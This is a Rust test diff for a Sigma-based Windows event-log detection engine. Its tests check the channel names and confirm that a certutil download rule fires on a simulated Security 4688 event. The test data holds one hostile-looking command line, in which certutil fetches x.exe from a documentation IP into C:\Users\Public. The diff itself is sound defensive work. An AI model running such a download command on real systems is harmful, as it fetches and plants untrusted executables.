@@ -899,3 +899,51 @@ fn benign_process_creation_extra_batch_fires_nothing() {
         "benign notepad launch should not fire, got {hits:?}"
     );
 }
+
+/// Live EVTX collection reads the files named by `referenced_channels()`. For the
+/// bundled rules that list must be real channel names covering every log the rules
+/// target — not raw Sigma service names like "security", which match no file on disk.
+#[test]
+fn bundled_rules_reference_real_channel_names() {
+    let engine = load_bundled();
+    let channels = engine.referenced_channels();
+    for want in [
+        "Security",
+        "System",
+        "Microsoft-Windows-Sysmon/Operational",
+        "Microsoft-Windows-PowerShell/Operational",
+    ] {
+        assert!(
+            channels.iter().any(|c| c == want),
+            "expected {want} in referenced channels, got {channels:?}"
+        );
+    }
+    assert!(
+        !channels.iter().any(|c| c == "security"),
+        "raw service names must not leak into channel list: {channels:?}"
+    );
+}
+
+/// The same certutil download fires on a real-shaped Security 4688 (no Sysmon): 4688
+/// carries `NewProcessName`/`ParentProcessName`, which the 4688 field aliases map to
+/// the `Image`/`ParentImage` names the rule is written against.
+#[test]
+fn certutil_download_fires_on_real_shaped_4688() {
+    let engine = load_bundled();
+    let ev = security_event(
+        4688,
+        json!({
+            "NewProcessName": r"C:\Windows\System32\certutil.exe",
+            "ParentProcessName": r"C:\Windows\System32\cmd.exe",
+            "CommandLine": r"certutil.exe -urlcache -split -f http://203.0.113.5/x.exe C:\Users\Public\x.exe",
+        }),
+    );
+    let findings = engine.match_event(&ev).expect("match");
+    assert!(
+        findings
+            .iter()
+            .any(|f| f.title == "Suspicious Download Via Certutil.EXE"),
+        "expected certutil download rule on 4688, got {:?}",
+        findings.iter().map(|f| &f.title).collect::<Vec<_>>()
+    );
+}
